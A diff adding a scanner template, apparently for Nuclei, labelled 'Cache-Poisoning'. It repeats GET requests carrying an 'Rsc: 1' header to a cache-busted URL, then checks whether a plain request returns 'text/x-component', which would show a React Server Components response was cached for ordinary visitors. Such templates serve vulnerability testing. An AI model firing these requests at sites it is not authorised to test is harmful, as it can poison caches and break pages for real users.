@@ -1,0 +1,88 @@
+id: multiple-requests
+
+info:
+  name: "Cache-Poisoning"
+  author: "YourName"
+  severity: critical
+  description: "This template sends multiple requests to the same URL."
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=5fr65"
+    headers:
+      Rsc: 1
+
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=5fr65"
+    headers:
+      Rsc: 1
+
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=5fr65"
+    headers:
+      Rsc: 1
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=5fr65"
+    headers:
+      Rsc: 1
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=5fr65"
+    headers:
+      Rsc: 1
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=5fr65"
+    headers:
+      Rsc: 1
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=5fr65"
+    headers:
+      Rsc: 1
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=5fr65"
+    headers:
+      Rsc: 1
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=5fr65"
+    headers:
+      Rsc: 1
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=5fr65"
+    headers:
+      Rsc: 1
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=5fr65"
+
+    matchers:
+          - type: word
+            part: header
+            words:
+            - "text/x-component"
